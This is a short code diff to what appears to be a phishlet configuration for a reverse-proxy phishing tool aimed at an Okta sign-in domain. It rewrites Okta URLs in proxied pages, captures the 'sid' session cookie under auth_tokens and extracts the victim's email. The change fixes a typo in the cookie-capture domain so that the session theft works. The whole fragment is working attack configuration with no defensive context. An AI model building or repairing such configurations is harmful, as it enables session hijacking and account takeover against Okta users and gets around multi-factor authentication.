@@ -13,7 +13,7 @@ sub_filters:
   - {hostname: 'EXAMPLE.okta.com', sub: '', domain: 'EXAMPLE.okta.com', search: 'https\\x3A\\x2F\\x2F{hostname}', replace: 'https\x3A\x2F\x2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}
   - {hostname: 'EXAMPLE.okta.com', sub: '', domain: 'EXAMPLE.okta.com', search: '\\x2Fuser\\x2Fnotifications', replace: 'https\x3A\x2F\x2FEXAMPLE.okta.com\x2Fuser\x2Fnotifications', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}
 auth_tokens:
-  - domain: 'EXAMPLEokta.com'
+  - domain: 'EXAMPLE.okta.com'
     keys: ['sid']
 user_regex:
   key: 'email'
